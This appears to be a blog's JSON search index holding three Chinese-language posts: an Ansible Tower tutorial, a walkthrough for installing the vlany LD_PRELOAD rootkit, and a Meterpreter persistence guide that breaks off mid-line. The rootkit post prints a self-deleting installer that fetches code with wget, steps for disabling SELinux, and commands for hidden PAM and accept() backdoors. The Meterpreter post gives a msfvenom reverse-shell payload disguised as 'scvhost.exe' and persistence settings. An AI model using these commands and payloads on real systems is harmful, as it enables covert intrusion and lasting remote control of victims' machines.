{"meta":{"title":"Kionf","subtitle":null,"description":"ä»€ä¹ˆæ ·çš„äººæ‰èƒ½å’Œæ—¶é—´æˆä¸ºæœ‹å‹ï¼Ÿ","author":"Kionf","url":"https://kionf.com"},"pages":[{"title":"","date":"2018-06-27T06:59:56.389Z","updated":"2017-05-09T10:50:24.000Z","comments":true,"path":"404.html","permalink":"https://kionf.com/404.html","excerpt":"","text":"var domain='https://qzonestyle.gtimg.cn/qzone_v6/lostchild/';","raw":null,"content":null},{"title":"åˆ†ç±»","date":"2015-12-22T04:39:04.000Z","updated":"2017-05-08T09:53:00.000Z","comments":false,"path":"categories/index.html","permalink":"https://kionf.com/categories/index.html","excerpt":"","text":"","raw":null,"content":null}],"posts":[{"title":"ansible tower å®æˆ˜ä½¿ç”¨è¯¦è§£","slug":"tower-useage","date":"2018-11-20T16:00:00.000Z","updated":"2018-11-21T08:46:59.767Z","comments":true,"path":"2018/11/21/tower-useage/","link":"","permalink":"https://kionf.com/2018/11/21/tower-useage/","excerpt":"\nansible tower 3.3.1 å®æˆ˜ä½¿ç”¨ï¼Œæ­¤æ–‡æ¡£ä¸ºè¿›é˜¶ä½¿ç”¨ä¸æ˜¯ç½‘ä¸Šçƒ‚å¤§è¡—çš„å®‰è£…éƒ¨ç½²ï¼Œå¦‚éœ€å®‰è£…é…ç½®ä»‹ç»ç§»æ­¥ansible-towerå®‰è£…åŠç ´è§£å‰å‡ å¹´å°±äº†è§£è¿‡toweré‚£æ—¶ä½¿ç”¨æ„Ÿè§‰ä»–çš„ç‚¹å­éªšï¼Œä½†ä½¿ç”¨ä¸æ˜¯ç‰¹åˆ«æ–¹ä¾¿ã€‚ç»è¿‡3.0å¤§æ”¹ç‰ˆåï¼Œç”¨ç€å¾ˆèˆ’å¦ï¼ï¼\n","text":"ansible tower 3.3.1 å®æˆ˜ä½¿ç”¨ï¼Œæ­¤æ–‡æ¡£ä¸ºè¿›é˜¶ä½¿ç”¨ä¸æ˜¯ç½‘ä¸Šçƒ‚å¤§è¡—çš„å®‰è£…éƒ¨ç½²ï¼Œå¦‚éœ€å®‰è£…é…ç½®ä»‹ç»ç§»æ­¥ansible-towerå®‰è£…åŠç ´è§£å‰å‡ å¹´å°±äº†è§£è¿‡toweré‚£æ—¶ä½¿ç”¨æ„Ÿè§‰ä»–çš„ç‚¹å­éªšï¼Œä½†ä½¿ç”¨ä¸æ˜¯ç‰¹åˆ«æ–¹ä¾¿ã€‚ç»è¿‡3.0å¤§æ”¹ç‰ˆåï¼Œç”¨ç€å¾ˆèˆ’å¦ï¼ï¼ 0x00 ä»‹ç»å…³äºAnsible Tower è¿™é‡Œä¸å¤šä»‹ç»ï¼Œå±äºå‘å¸ƒé…ç½®ç®¡ç†ç³»ç»Ÿï¼Œæ”¯æŒApiåŠç•Œé¢æ“ä½œï¼ŒDjangoç¼–å†™ã€‚â˜ï¸å­—å±Œ å®éªŒç¯å¢ƒ1234CentOS Linux release 7.4.1708Ansible Tower 3.3.1ä¸‹è½½åœ°å€ï¼š https://releases.ansible.com/ansible-tower/setup/å‚è€ƒæ–‡æ¡£ï¼šhttps://docs.ansible.com/ansible-tower/latest/html/ å…³äºæ–°ç‰ˆå¯¼èˆªæ ä»‹ç» 12345678910111213141516171819202122232425# viewesDashboard ä»ªè¡¨ç›˜å±•ç¤ºä¿¡æ¯çš„Jobs è·‘è¿‡çš„ä»»åŠ¡è®°å½•Schedules è®¡åˆ’ä»»åŠ¡My View æŸ¥çœ‹ç”¨æˆ·çš„å·¥ä½œæ¨¡ç‰ˆï¼Œå’Œä»»åŠ¡è®°å½•# resourcesTemplates ä»»åŠ¡æ¨¡ç‰ˆï¼Œé…ç½®è°ƒç”¨playbookæ‰§è¡Œæ—¶çš„å„ç§å‚æ•°ï¼Œä»æ­¤å¤„æ·»åŠ è®¡åˆ’ä»»åŠ¡Credentials é…ç½®è¿æ¥ æœºå™¨/äº‘ä¸»æœºapi Key/è‡ªå®šä¹‰çš„å‡­è¯ç±»å‹ çš„è´¦å·å¯†ç ç­‰ä¿¡æ¯Projects è¿™é‡Œé…ç½®é¡¹ç›®å¯¹åº”çš„playbookï¼Œå¯ä»¥ä»Gitä¸Šæ‹‰å–æˆ–ä»æœ¬åœ°æ–‡ä»¶å¤¹è¯»å–playbookInventories èµ„äº§æ¸…å•Inventory Scripts è‡ªå®šä¹‰è·å–èµ„äº§æ¸…å•çš„è„šæœ¬# accessOrganizations ç»„ç»‡ç®¡ç†Users ç”¨æˆ·ç®¡ç†Teams ç”¨æˆ·ç»„ç®¡ç†# AdministrationCredential Types è‡ªå®šä¹‰å‡­è¯ç±»å‹ï¼Œæ·»åŠ åå¯åœ¨Credentialsä¸­ä½¿ç”¨Notifications é…ç½®ä»»åŠ¡é€šçŸ¥ï¼Œæ”¯æŒç”µå­é‚®ä»¶ï¼ŒTwillioç”µè¯ç­‰Management Jobs è®¡åˆ’ä»»åŠ¡ç®¡ç†Instance Groups èµ„äº§ç»„ç®¡ç†Applications è‡ªå®šä¹‰åº”ç”¨Settings è®¾ç½® åˆå§‹æµç¨‹ï¼šä»Inventoriesæ·»åŠ ä¸»æœº &gt; Credentialsæ·»åŠ è¿æ¥æœºå™¨å¯†ç /æ·»åŠ gitè´¦å·ï¼ˆç”¨æ¥Projectsä»Gitæ‹‰å–Playbookï¼‰ &gt; Projectsé…ç½®playbookè·å–æ–¹å¼ &gt; TemplatesæŒ‡å®šé‚£äº›æœºå™¨è·‘Playbookï¼Œå’Œè¿è¡Œæ—¶çš„å‚æ•° 0x00 å¦‚ä½•æ‰¹é‡å¯¼å…¥èµ„äº§æ–°ç‰ˆæœ¬çš„ansible-toweréå¸¸å¼ºå¤§ï¼Œç¬”è€…ç›¸ä¿¡ä»–ä¸€å®šèƒ½ç«™èµ·æ¥ã€‚å…³äºèµ„äº§çš„å¯¼å…¥ansible towerå†…éƒ¨æ”¯æŒä»äº‘å‚å•†æˆ–è€…ç§æœ‰è™šæ‹ŸåŒ–äº‘ç›´æ¥å¯¼å…¥æœºå™¨ï¼Œå¦‚æœä½ ä½¿ç”¨çš„äº‘å‚å•†ä¸æ”¯æŒï¼Œè¿˜å¯è‡ªå·±ç¼–å†™python/shellè„šæœ¬æ¥è°ƒç”¨äº‘å‚å•†APIæ·»åŠ åˆ°ansible towerèµ„äº§ä¸­ã€‚æŠ“ç´§ Letâ€™s Go 0x01 é€šè¿‡UIç•Œé¢å¯¼å…¥ç‚¹å‡»Inventoriesç‚¹å‡»æ·»åŠ æŒ‰é’®ï¼Œä¼šæç¤ºå‡ºä¸¤ç§Inventoryï¼šInventory æ­£å¸¸çš„èµ„äº§ï¼Œ Smart Inventory æ ¹æ®ä»Inventoryç­›é€‰æ¡ä»¶å˜åŒ–çš„ 1ï¼‰æ·»åŠ Inventory ä¿å­˜ååœ¨ç‚¹å‡»HOSTSæ·»åŠ ä¸»æœº 2ï¼‰æ·»åŠ Smart Inventory Smart Inventory æ˜¯é€šè¿‡ç­›é€‰IP/ä¸»æœºåç§°/idèŒƒå›´ æ¥å®šä¹‰çš„ä¸»æœºæ¸…å• 0x02 é€šè¿‡å‘½ä»¤è¡Œtower-manageæ‰¹é‡æ·»åŠ ä¸»æœºé€šè¿‡Towerè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·tower-manageæ¥æ‰¹é‡å¯¼å…¥ä¸»æœºï¼Œå¯ä»¥ä»ä¸»æœºçš„/etc/ansible/hostsä¸­ç›´æ¥å¯¼å…¥ ç¤ºä¾‹æ–‡ä»¶12345678910111213141516171819202122232425262728[test:children]test-signaltest-mysqltest-rtctest-tomcat[test-rtc]172.16.8.193 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.189 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.187 ansible_ssh_port=52330 ansible_ssh_user=root[test-mysql]172.16.8.186 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.185 ansible_ssh_port=52330 ansible_ssh_user=root[test-signal]172.16.8.190 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.191 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.197 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.198 ansible_ssh_port=52330 ansible_ssh_user=root[test-tomcat]172.16.8.184 ansible_ssh_user=root172.16.8.188 ansible_ssh_user=root[test-nginx]172.16.8.191 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.190 ansible_ssh_port=52330 ansible_ssh_user=root å‘½ä»¤å¯¼å…¥åˆ°èµ„äº§æ¸…å•12345678tower-manage inventory_import --source=/etc/ansible/hosts --group-filter=test --inventory-name=æµ‹è¯•ç¯å¢ƒ --keep-vars 1.569 INFO Updating inventory 7: æµ‹è¯•ç¯å¢ƒ 1.674 INFO Reading Ansible inventory source: /etc/ansible/hosts 3.003 INFO Processing JSON output... 3.004 INFO Loaded 7 groups, 11 hosts 3.292 INFO Inventory import completed for (æµ‹è¯•ç¯å¢ƒ - 17) in 1.7s é€‰é¡¹ä»‹ç»ï¼š 123456789101112--source æŒ‡å®šinventoryæ–‡ä»¶--group-filter ä»æ–‡ä»¶ä¸­é€šè¿‡ç»„åè¿‡æ»¤--host-filter é€šè¿‡host nameè¿‡æ»¤--inventory-name å¯¼å…¥åˆ°æŒ‡å®šåç§°èµ„äº§æ¸…å•--inventory-id å¯¼å…¥åˆ°æŒ‡å®šIDçš„èµ„äº§æ¸…å•# name å’Œ id é€‰ä¸€ä¸ª--overwrite è¦†ç›–ä¸»æœºå’Œç»„ï¼Œé»˜è®¤ä¸è¦†ç›–--overwrite-vars è¦†ç›–ä¸»æœºå˜é‡--keep-vars ä¿æŒä¸»æœºå˜é‡--enabled-value å¯¼å…¥çš„ä¸»æœºçŠ¶æ€æ˜¯å¦æ¿€æ´»é»˜è®¤æ¿€æ´» å¯¼å…¥ç»“æœ 0x03 å¯¼å…¥äº‘å‚å•†ä¸»æœºæš‚æœªä½¿ç”¨ğŸ˜‚ 0x01 åˆ›å»ºå‡­è¯å¯ä»¥åˆ›å»ºå„ç§å„æ ·çš„å‡­è¯ï¼Œè¿æ¥äº‘å‚å•†Apiçš„å‡­è¯/è¿æ¥gitlabçš„å‡­è¯/è¿æ¥Linuxä¸»æœºçš„å‡­è¯/è‡ªå®šä¹‰çš„å‡­è¯ç­‰ç­‰ã€‚ã€‚æˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªGitlabè®¤è¯ç”¨æ¥æ‹‰å–æˆ‘ä»¬çš„Playbook 0x01 åˆ›å»ºç‰ˆæœ¬æ§åˆ¶å‡­è¯ Credential Typeé€‰æ‹©Source Control 0x02 åˆ›å»ºç™»é™†æœºå™¨å‡­è¯ Credential Type é€‰æ‹© Machine 0x02 åˆ›å»ºé¡¹ç›®playbookæ‹‰å–çš„æ–¹å¼ä¸»è¦æœ‰ï¼š 12345- Manual ä»æœ¬åœ°ç›®å½•è¯»å–- Git ä»Gitæ‹‰å–- Mercurial ä»mer- SVN- RedHatInsights è¿™é‡Œé€‰ç”¨Gitä»Gitlabä¸Šæ‹‰å– Optionsé€‰é¡¹é…ç½®ï¼š 123456- Clean åœ¨ä»gitlabæ‹‰å–å‰æ¸…é™¤æœ¬åœ°ä¿®æ”¹çš„playbook- Delete on Update å½“æ›´æ–°æ—¶åˆ é™¤æ‰€æœ‰æœ¬åœ°å‚¨å­˜playbook- Update Revision on Launch å½“Templatesä»»åŠ¡è¿è¡Œæ—¶ï¼Œè‡ªåŠ¨ä»gitæ‹‰å–æ›´æ–° tower æµ‹è¯•playbookåœ°å€ï¼štower-example 0x03 åˆ›å»ºä»»åŠ¡æ¨¡æ¿æœ€åä¸€æ­¥æ¥äº†,åˆ›å»ºTemplates Optionsé€‰é¡¹é…ç½®ï¼š 12345678- Enable Privilege Escalation # é»˜è®¤è„šæœ¬ä»¥awxç”¨æˆ·æ‰§è¡Œplaybookï¼Œå¼€å¯åä½¿ç”¨ç®¡ç†å‘˜èº«ä»½- Allow Provisioning Callbacks # è¿è¡Œé€šè¿‡urlå›è°ƒæ¥å¯åŠ¨è¿™ä¸ªä»»åŠ¡- Enable Concurrent Jobs # å…è®¸ç›¸åŒä»»åŠ¡ä¸€èµ·è¿è¡Œ- Use Fact Cache # ä½¿ç”¨ç¼“å­˜ ç‚¹å‡»SCHEDULESå¯ä»¥æ·»åŠ è®¡åˆ’ä»»åŠ¡ 0x04 å®Œç»“ æˆ‘ç›¸ä¿¡Towerä¼šç«™èµ·æ¥ğŸ˜‚ï¼Œåç»­å†è¡¥å……ã€‚ å‚è€ƒï¼š https://docs.ansible.com/ansible-tower/latest/html/","raw":null,"content":null,"categories":[{"name":"è‡ªåŠ¨åŒ–è¿ç»´","slug":"è‡ªåŠ¨åŒ–è¿ç»´","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/"},{"name":"ansible tower","slug":"è‡ªåŠ¨åŒ–è¿ç»´/ansible-tower","permalink":"https://kionf.com/categories/è‡ªåŠ¨åŒ–è¿ç»´/ansible-tower/"}],"tags":[{"name":"Ansible-Tower","slug":"Ansible-Tower","permalink":"https://kionf.com/tags/Ansible-Tower/"}]},{"title":"LinuxåŠ¨æ€é“¾æ¥åº“é¢„åŠ è½½å‹åé—¨ï¼ŒVlanyå®‰è£…åŠåˆ†æ","slug":"rookit-vlany","date":"2018-10-24T16:00:00.000Z","updated":"2018-10-31T10:19:28.319Z","comments":true,"path":"2018/10/25/rookit-vlany/","link":"","permalink":"https://kionf.com/2018/10/25/rookit-vlany/","excerpt":"\n\næ­¤å·¥å…·vlanyé€šè¿‡LD_PRELOADç¯å¢ƒå˜é‡å’Œ/etc/ld.so.preloadçš„é…ç½®æ–‡ä»¶æ¥é‡å†™ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼ŒåŠ è½½æ”»å‡»è€…è‡ªå®šä¹‰çš„æ¶æ„å‡½æ•°ã€‚\n","text":"æ­¤å·¥å…·vlanyé€šè¿‡LD_PRELOADç¯å¢ƒå˜é‡å’Œ/etc/ld.so.preloadçš„é…ç½®æ–‡ä»¶æ¥é‡å†™ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼ŒåŠ è½½æ”»å‡»è€…è‡ªå®šä¹‰çš„æ¶æ„å‡½æ•°ã€‚ 0x00 å·¥å…·åŸç†åˆ†æ é¢„åŠ è½½åŠ¨æ€è¿æ¥åº“è¿™ç§åˆ©ç”¨æŠ€æœ¯ï¼Œåœ¨æ—©äº›å¹´å›½å¤–å°±å·²ç»æœ‰è¿‡åˆ©ç”¨ç›¸å…³çš„æ–‡ç« ã€‚åªæ˜¯è¿‘å¹´å›½å†…æ¶æ„è½¯ä»¶åˆ©ç”¨é¢‘ç¹è¢«å„å¤§å®‰å…¨å‚å•†æ•è·åˆ†æï¼Œä¹Ÿå°±æ¸æ¸å…¬å¸ƒåœ¨å¤§ä¼—çœ¼å‰ã€‚å¯¹äºè¿™ç§åˆ©ç”¨çš„å¤§æ¦‚åŸç†ï¼Œå·²æœ‰æ–‡ç« åšäº†æ·±å…¥åˆ†æï¼Œè¿™é‡Œå°±ä¸é‡å¤é€ è½®ã€‚æ–‡ç« åœ°å€ï¼šè­¦æƒ•åˆ©ç”¨Linuxé¢„åŠ è½½å‹æ¶æ„åŠ¨æ€é“¾æ¥åº“çš„åé—¨ 0x01 ä¸‹è½½é¡¹ç›®å®éªŒç¯å¢ƒCentOS-6.9 å†…æ ¸ï¼š2.6.32-696.el6.x86_64 æ¶æ„ï¼šx86_64Kali-2018 å†…æ ¸ï¼š4.17.0-kali1-amd64 æ¶æ„ï¼šx86_64 #ä¸æ”¯æŒ ç¼–è¾‘æ–‡ä»¶quick_install.shï¼š åé—¨å®‰è£…è„šæœ¬é¡¹ç›®åœ°å€123456789101112131415161718#!/bin/sh[ $(id -u) != 0 ] &amp;&amp; &#123; echo \"Not root. Exiting.\"; exit; &#125;WORKING_DIR=\"/tmp/.$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)\"ARCHIVE_NAME=\"$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1).tar.gz\"mkdir $WORKING_DIR &amp;&amp; cd $WORKING_DIRwget https://github.com/mempodippy/vlany/archive/master.tar.gz -O $ARCHIVE_NAMEtar xvpfz $ARCHIVE_NAME &amp;&amp; rm $ARCHIVE_NAMEcd vlany-masterchmod +x install.sh./install.shrm -rf $WORKING_DIR#ä¸‹è½½å®Œååˆ é™¤é¡¹ç›®rm -f $0#æ‰§è¡Œååˆ é™¤è‡ªèº«è„šæœ¬ 0x02 ç¼–è¯‘å®‰è£…quick_install.shä¸‹è½½é¡¹ç›®åè§£å‹è°ƒç”¨install.shè„šæœ¬ï¼Œé¦–å…ˆä¼šæ£€æµ‹SElinuxæ˜¯å¦å…³é—­å¦‚æœæ²¡å…³é—­ï¼Œè„šæœ¬ä¼šå…³é—­SElinuxã€‚æ­¤æ—¶éœ€è¦é‡å¯æœºå™¨ã€‚ å®é™…åº”ç”¨ä¸­ï¼Œå¦‚æœä¸æƒ³é‡å¯æœºå™¨ï¼Œå¯ä»¥å•ç‹¬ä¸‹è½½é¡¹ç›®æ‰§è¡Œå‘½ä»¤wget https://github.com/mempodippy/vlany/archive/master.tar.gz &amp;&amp; tar xvpfz master.tar.gz &amp;&amp; cd vlany-masteré‡æ–°å»ºç«‹ç»ˆç«¯ï¼Œç„¶åè¾“å…¥setenforce 0ï¼Œå†æ›´æ”¹install.shè„šæœ¬ install.sh202122232425 if [[ $(sestatus -v | head -n 1) == *\"enabled\"* ]]; then echo \"SELinux is still enabled. Reboot.\" exit # æ³¨é‡Šæ­¤è¡Œ else echo \"SELinux is disabled.\" fi æ£€éªŒå®ŒSElinuxï¼Œç¨‹åºå‡ºç°æç¤ºæ¡†é€‰åœ¨grubé…ç½®ä½ç½®ï¼Œæ¥ç¡®è®¤å½“æœºå™¨é‡å¯å åé—¨ä¾ç„¶ç”Ÿæ•ˆã€‚æ ¹æ®æœºå™¨å®é™…æƒ…å†µå¡«å†™ï¼Œé»˜è®¤/etc/grub.conf Enter location of bootloader config file (if grub2, config file is /boot/grub/grub.cfg) [/etc/grub.conf]: ç„¶åä¸€è·¯å›è½¦ï¼Œç­‰å¾…gccç­‰ä¾èµ–å®‰è£…å®Œæˆï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢ã€‚é€‰æ‹©æ˜¯ç¼–è¯‘å¹¶å®‰è£…ï¼Œè¿˜æ˜¯åªç¼–è¯‘ï¼Œæˆ‘ä»¬è¿™é‡Œé€‰åœ¨YES 1. é…ç½®PAMåé—¨å†ä¸€è·¯å›è½¦ï¼Œåˆ°å¦‚ä¸‹ç•Œé¢ã€‚è®¾ç½®é€šè¿‡sshè¿æ¥çš„PAMç”¨æˆ·åï¼Œè®°ä½æ­¤åé—¨ç”¨æˆ·å ç„¶åè®¾ç½®PAMå¯†ç ï¼Œè¿™é‡Œè¾“å…¥å¯†ç ä¸ä¼šå›æ˜¾ä»»ä½•ä¸œè¥¿ï¼Œç»§ç»­è¾“å…¥å°±ok è®¾ç½®PAMç«¯å£ï¼Œä¹Ÿæ˜¯éœ€è¦éšè—çš„ç«¯å£ 2. é…ç½®accept()åé—¨è®¾ç½®è¿æ¥æ˜¯å¦ä½¿ç”¨SSLåŠ å¯†ï¼Œè¿™æµ‹è¯•é€‰æ‹©NO è®¾ç½®accept()åé—¨å¯†ç ï¼Œä¸€æ ·æ²¡æœ‰å›æ˜¾ã€‚ è®¾ç½®accept()åé—¨éšè—ç«¯å£ è®¾ç½®execve()å¯†ç ï¼Œç„¶åå†å†å†ä¸€è·¯å›è½¦ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢ï¼Œæ˜¯å¦åˆ é™¤ç¼–è¯‘é¡¹ç›®çš„è·¯å¾„ã€‚ å®Œæˆåï¼Œè„šæœ¬ä¼šæç¤ºæ˜¯å¦å®‰è£…ä½œè€…æ–°ç ”ç©¶çš„snodewåé—¨è¿™é‡Œé€‰æ‹©NO 1Installation has finished. Would you like to setup the experimental snodew root reverse shell backdoor? (YES/NO) (case-sensitive) [YES]: 3. è¿æ¥ä¿¡æ¯123456789101112131415#sshè¿æ¥PAMç”¨æˆ·åPAM backdoor username: ***REMOVED***#PAMç«¯å£Hidden PAM port: 4397#acceptåé—¨éšæœºç«¯å£å·accept backdoor low port: 271accept backdoor high port: 274#åé—¨ä½ç½®Hidden directory: /lib/libc.so.***REMOVED***.14#å˜é‡Environment variable: UVRTBKAYCLWI å…¨éƒ¨é…ç½®å®Œæˆåï¼Œä¼šå‘ˆç°å‡ºå¦‚ä¸Šè¿æ¥ä¿¡æ¯ 0x03 è¿æ¥åé—¨1. PAMåé—¨è¿æ¥ssh.sh12345678910111213141516#!/bin/bash# Small bash script designed to allow easy connection to hidden PAM backdoors.# Gets copied to your hidden directory in case you want to route through more# than one rooted box. :)usage () &#123; echo \"$0 &lt;PAM backdoor username&gt; &lt;host&gt; &lt;hidden PAM port&gt;\"; exit; &#125;[ -z $1 ] &amp;&amp; &#123; usage; &#125;[ -z $2 ] &amp;&amp; &#123; usage; &#125;[ -z $3 ] &amp;&amp; &#123; usage; &#125;[ ! -f /usr/bin/socat ] &amp;&amp; &#123; echo \"socat isn't installed. exiting.\"; exit; &#125;echo \"Connecting to PAM backdoor @ host $2 on hidden PAM port $3 as $1\"read -p \"Press enter to continue\"ssh -o ProxyCommand=\"socat - tcp4-connect:$2:22,bind=:$3\" $2 -l \"$1\" ä½¿ç”¨å…¶ä»–æœºå™¨è¿æ¥åé—¨ï¼Œç¼–è¾‘æ–‡ä»¶ssh.shã€‚ 1sh ssh.sh ***REMOVED*** 192.168.10.35 4397 è¿æ¥æˆåŠŸ åœ¨è¢«æ”»å‡»ç«¯æŸ¥çœ‹æ˜¯å¦æœ‰å¼‚å¸¸è¿æ¥ï¼Œå®Œå…¨éšè—æ²¡æœ‰æ˜¾ç¤ºå‡ºä»»ä½•è¿æ¥ä¿¡æ¯ï¼Œå¹¶ä¸”æŸ¥çœ‹/etc/passwdæ–‡ä»¶ï¼Œæ²¡æœ‰æˆ‘ä»¬æ‰€ä½¿ç”¨çš„***REMOVED***ç”¨æˆ· æ³¨æ„ï¼šå¦‚æœä¸ä½¿ç”¨ssh.shè„šæœ¬è¿æ¥pamåé—¨ï¼Œç›´æ¥ä½¿ç”¨sshè¿æ¥ã€‚è¢«æ”»å‡»ç«¯ä¼šæŸ¥çœ‹åˆ°sshè¿æ¥ä¿¡æ¯ 2. accept()åé—¨è¿æ¥1234567#accept backdoor low port: 271#accept backdoor high port: 274# -p æŒ‡å®š 271-274 èŒƒå›´å†…ç«¯å£nc 192.168.10.35 22 -p 271#è¾“å…¥è®¾å®šçš„acceptå¯†ç åå›è½¦***REMOVED*** [+] shell dropped accept()åé—¨åœ¨å®é™…æµ‹è¯•ä¸­æ²¡æœ‰æˆåŠŸï¼Œç”±äºå†…æ ¸ç‰ˆæœ¬ç­‰é—®é¢˜ã€‚ 0x04 æ£€æµ‹1git clone https://github.com/mempodippy/detect_preload.git &amp;&amp; cd detect_preload &amp;&amp; ./detect_preload æ‰§è¡Œä»¥ä¸Šå°ç¨‹åºæŸ¥çœ‹è¾“å‡º 1234567[+] finished basic checks0x7f0144ca2000 /lib64/libdl.so.20x7f014490a000 /lib64/libc.so.60x7f01446ca000 /lib64/libcrypt.so.1(nil) /lib64/ld-linux-x86-64.so.20x7f01444c2000 /lib64/libfreebl3.so æ­¤ç¨‹åºè·å–åŠ¨æ€è¿æ¥åº“ä¿¡æ¯ï¼Œld-linux-x86-64.so.2 æ— æ³•è·å–ï¼Œå­˜åœ¨åé—¨ã€‚æ­¤rookitæ¸…ç†åªèƒ½æ›¿æ¢è¢«ä¿®æ”¹çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“ å‚è€ƒï¼š vlany_readme_file ç³»ç»Ÿå‡½æ•° vlany_wiki ğŸ‘¿","raw":null,"content":null,"categories":[{"name":"Sec","slug":"Sec","permalink":"https://kionf.com/categories/Sec/"},{"name":"Rookit","slug":"Sec/Rookit","permalink":"https://kionf.com/categories/Sec/Rookit/"}],"tags":[{"name":"Rookit","slug":"Rookit","permalink":"https://kionf.com/tags/Rookit/"}]},{"title":"å…³äº meterpreter æŒä¹…åŒ–é—®é¢˜ç ”ç©¶","slug":"metasploit-presistence","date":"2018-09-12T16:00:00.000Z","updated":"2018-10-31T10:19:28.311Z","comments":true,"path":"2018/09/13/metasploit-presistence/","link":"","permalink":"https://kionf.com/2018/09/13/metasploit-presistence/","excerpt":"meterperter è·å–åˆ°Sessionæ—¶å¦‚æœå½“å‰sessioné€€å‡ºï¼Œå°±ä¸ä¼šåœ¨è‡ªåŠ¨è¿æ¥ï¼Œä½¿ç”¨å¸¸è§æŒä¹…åŒ–ä¹Ÿåªæ˜¯åœ¨è¿œç¨‹ç”¨æˆ·ç™»å½•ï¼Œæˆ–è€…è¿œç¨‹æœºå™¨é‡å¯æ—¶æ‰ä¼šè¿”å›sessionã€‚ä»Šå¤©ä¸»è¦ä»‹ç»persistenceè„šæœ¬çš„è‡ªå®šä¹‰é…ç½®ï¼Œæ¥å®ç°å¦‚æœsessionæ–­å¼€ï¼Œå®¢æˆ·ç«¯å®šæ—¶é‡æ–°å°è¯•è¿æ¥æœåŠ¡ç«¯(msfç«¯)\n","text":"meterperter è·å–åˆ°Sessionæ—¶å¦‚æœå½“å‰sessioné€€å‡ºï¼Œå°±ä¸ä¼šåœ¨è‡ªåŠ¨è¿æ¥ï¼Œä½¿ç”¨å¸¸è§æŒä¹…åŒ–ä¹Ÿåªæ˜¯åœ¨è¿œç¨‹ç”¨æˆ·ç™»å½•ï¼Œæˆ–è€…è¿œç¨‹æœºå™¨é‡å¯æ—¶æ‰ä¼šè¿”å›sessionã€‚ä»Šå¤©ä¸»è¦ä»‹ç»persistenceè„šæœ¬çš„è‡ªå®šä¹‰é…ç½®ï¼Œæ¥å®ç°å¦‚æœsessionæ–­å¼€ï¼Œå®¢æˆ·ç«¯å®šæ—¶é‡æ–°å°è¯•è¿æ¥æœåŠ¡ç«¯(msfç«¯) 0x00 å»ºç«‹è¿æ¥æœåŠ¡ç«¯å¯åŠ¨msfå¹¶ç›‘å¬ç«¯å£ç­‰å¾…session åå°ç›‘å¬ç«¯å£12345678910msf&gt; handler -p windows/meterpreter/reverse_tcp -H 0.0.0.0 -P 33333msf&gt; jobsJobs==== Id Name Payload Payload opts -- ---- ------- ------------ 5 Exploit: multi/handler windows/meterpreter/reverse_tcp tcp://0.0.0.0:33333 ç”Ÿæˆåé—¨æ–‡ä»¶å®¢æˆ·ç«¯æ‰§è¡Œå»ºç«‹è¿æ¥: ä¸å…æ€ï¼Œæœ¬æ–‡ä¸åšä»‹ç»123msf&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=b1g-d1ck.kionf.com lport=33333 -f exe &gt; scvhost.exe# lhostä¸ºè¿œç¨‹ä¸»æœº# lportä¸ºè¿œç¨‹ä¸»æœºç«¯å£ è·å–åˆ°å®¢æˆ·ç«¯session,æŒ‡å®šsession id è¿›å…¥meterpreterä¼šè¯ 12345msf&gt; session -i 6[*] Starting interaction with 6...meterpreter &gt; 0x01 persistenceè„šæœ¬æŒä¹…åŒ– å½“ä½¿ç”¨run persistenceè¿›è¡ŒæŒä¹…åŒ–æ—¶é»˜è®¤è¿œç¨‹è·¯å¾„ä¼šæ¨é€åˆ°%TEMP%(â€œc:\\users\\appdata\\local\\temp\\â€œ)ã€‚å½“ç”¨æˆ·é‡å¯æˆ–è€…tempç›®å½•ä¸‹å­˜åœ¨æ•°å­—idï¼ŒpersistenceæŒä¹…åŒ–å°±ä¼šå‡ºé”™ã€‚ metasploit æ–°ç‰ˆæœ¬å·²ä¸æ¨èä½¿ç”¨æ­¤è„šæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨run persistence -h æŸ¥çœ‹é€‰é¡¹ä¿¡æ¯æ—¶ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥åˆ†æç›´æ¥è„šæœ¬æ–‡ä»¶ åˆ†æpersistencerubyè„šæœ¬æ–‡ä»¶/usr/share/metasploit-framework/scripts/meterpreter/persistence.rb vimæ‰“å¼€:set nuæ˜¾ç¤ºè¡Œå·ï¼Œæ ¹æ®åç§°å¯è‡ªè¡Œåˆ†ææ›´æ”¹é…ç½® ä»£ç ç‰‡æ®µï¼Œæ­¤ä»£ç æ®µä¸ºé»˜è®¤é…ç½®14 key = \"HKLM\"1516 # Default parameters for payload17 rhost = Rex::Socket.source_address(\"b1g-d1ck.kionf.com\")18 rport = 3333319 delay = 1020 install = false21 autoconn = false22 serv = false23 altexe = nil24 target_dir = nil25 payload_type = \"windows/meterpreter/reverse_tcp\"26 script = nil27 script_on_target = nil æ­¤ä»£ç æ®µä¸ºå¸®åŠ©ä¿¡æ¯31 \"-h\" =&gt; [ false, \"This help menu\"],32 \"-r\" =&gt; [ true, \"The IP of the system running Metasploit listening for the connect back\"],33 \"-p\" =&gt; [ true, \"The port on which the system running Metasploit is listening\"],34 \"-i\" =&gt; [ true, \"The interval in seconds between each connection attempt\"],35 \"-X\" =&gt; [ false, \"Automatically start the agent when the system boots\"],36 \"-U\" =&gt; [ false, \"Automatically start the agent when the User logs on\"],37 \"-S\" =&gt; [ false, \"Automatically start the agent on boot as a service (with SYSTEM privileges)\"],38 \"-A\" =&gt; [ false, \"Automatically start a matching exploit/multi/handler to connect to the agent\"],39 \"-L\" =&gt; [ true, \"Location in target host to write payload to, if none \\%TEMP\\% will be used.\"],40 \"-T\" =&gt; [ true, \"Alternate executable template to use\"],41 \"-P\" =&gt; [ true, \"Payload to 